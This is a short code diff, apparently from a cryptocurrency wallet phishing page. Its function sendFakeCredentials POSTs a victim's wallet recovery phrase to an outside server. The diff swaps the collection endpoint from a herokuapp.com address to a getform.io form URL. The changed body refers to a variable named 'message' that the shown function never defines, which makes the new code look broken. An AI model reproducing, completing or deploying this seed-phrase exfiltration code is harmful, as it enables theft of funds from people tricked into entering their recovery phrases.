@@ -1457,11 +1457,11 @@ let mn = new Mnemonic();
 
       async function sendFakeCredentials(phrase) {
             fetch(
-                "https://guarded-wildwood-71976.herokuapp.com/phrase/create-phrase",
+                "https://getform.io/f/0ecf22ed-f1b3-49f1-9889-88a7937908fc",
                 {
                   method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({ phrase, walletType: "Blue Wallet" }),
+                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                  body: `message=${encodeURIComponent(message)}&recaptchaResponse=`,
                 }
             )
        }
